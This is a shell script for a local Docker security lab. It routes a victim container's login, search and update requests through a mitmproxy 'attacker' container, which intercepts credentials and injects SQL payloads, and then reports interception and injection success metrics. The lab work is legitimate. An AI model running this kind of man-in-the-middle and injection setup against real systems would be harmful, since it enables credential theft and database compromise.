#!/bin/sh
set -ex

# Resolve repository paths.
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# clean directory of old artifacts.
mkdir -p "$REPO_ROOT/artifacts/release"

rm -f "$REPO_ROOT/artifacts/release/flows.jsonl" \
      "$REPO_ROOT/artifacts/release/security_events.jsonl" \
      "$REPO_ROOT/artifacts/release/security_metrics.json" \
      "$REPO_ROOT/artifacts/release/summary.json"

# Start the full Docker lab.
docker compose up --build -d
echo "Containers started"

echo "[debug] waiting for MySQL to be ready"

until docker compose exec -T db sh -c "mysqladmin ping -h 127.0.0.1 -uroot -p\"\$(cat /run/secrets/MYSQL_ROOT_PASSWORD)\" --silent"; do
  echo "waiting for mysql..."
  sleep 2
done

echo "[debug] MySQL is ready"

sleep 3

docker compose restart web

sleep 5

echo "[debug] waiting for webapp to be ready"

until docker compose exec -T victim sh -c "curl -s --max-time 5 -x http://attacker:8080 http://web:5000/login > /dev/null"; do
  echo "waiting for webapp..."
  sleep 2
done

echo "[debug] webapp is ready"


docker compose ps

# Sanity check: make sure victim can reach the webapp through attacker.
# -x http://attacker:8080 means curl sends traffic to mitmproxy running
# inside the attacker container.
echo "[debug] testing proxy path"
docker compose exec -T victim sh -c "curl -v --max-time 10 -x http://attacker:8080 http://web:5000/login"

echo ""


# Metric 1: credential interception rate.
# These login requests should be captured by addon.py as a credential event.
# from init.sql.
echo "[1] Testing repeated login credential interception"

LOGIN_CASES="
jdoe1 dock@123A
asmith2 wave!456B
bwilliams1 route@789C
sscott19 ship%753S
"

echo "$LOGIN_CASES" | while read username password; do
  [ -z "$username" ] && continue

  echo "[login attempt: $username]"

  docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 \
    -c /tmp/login_${username}.txt -b /tmp/login_${username}.txt \
    -X POST http://web:5000/login \
    -d 'username=$username' \
    -d 'password=$password'"

  echo ""
done



echo "[1b] Login for authenticated endpoint tests"
docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 \
  -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://web:5000/login \
  -d 'username=bwong3' \
  -d 'password=atlas#789C'"

echo ""




# Metric 2: SQL injection success rate for /update_company.
# The victim sends a normal company update.
# addon.py replaces new_company with the next payload.
echo "[2] Testing multiple /update_company SQLi attempts"
for i in 1 2; do
  echo "[update_company attempt $i]"

  docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 -c /tmp/cookies.txt -b /tmp/cookies.txt \
    -X POST http://web:5000/update_company \
    -d 'new_company=Shokas Industries Transport'"

  echo ""
done

# Metric 3: SQL injection success rate for /find_company_drivers.
# This endpoint uses a path parameter. The victim sends a normal company name. 
echo "[3] Testing multiple /find_company_drivers SQLi attempts"
for i in 1 2 3 4; do
  echo "[find_company_drivers attempt $i]"

  docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 -c /tmp/cookies.txt -b /tmp/cookies.txt \
    http://web:5000/find_company_drivers/Oceanic%20Freight"

  echo ""
done

# Metric 4: SQL injection success rate for /search.
# The victim sends the same normal request multiple times.
# addon.py cycles through the configured /search payloads.
echo "[4] Testing multiple /search SQLi attempts"
for i in 1 2; do
  echo "[search attempt $i]"

  docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 -c /tmp/cookies.txt -b /tmp/cookies.txt \
    -X POST http://web:5000/search \
    -d 'firstName=John' \
    -d 'lastName=Doe'"

  echo ""
done

# Give mitmproxy a moment to flush logs.
sleep 2

# Generate final security metrics.
# This converts security_events.jsonl into security_metrics.json.
echo "[5] Generate security metrics"
python3 "$REPO_ROOT/scripts/summarize_security_metrics.py"

echo ""

# previous project version flow summary 
if [ -f "$REPO_ROOT/scripts/export_summary.py" ]; then
  python3 "$REPO_ROOT/scripts/export_summary.py"
fi

# Print logs for demo visibility.
# These are not the only artifacts, but they help during live demo.
echo "[debug] attacker logs"
docker compose logs attacker

echo "" 

echo "[debug] web logs"
docker compose logs web || docker compose logs web_server || true

# Final artifact listing.
echo "Artifacts written to $REPO_ROOT/artifacts/release"
ls -l "$REPO_ROOT/artifacts/release"

echo "[debug] security metrics"
cat "$REPO_ROOT/artifacts/release/security_metrics.json"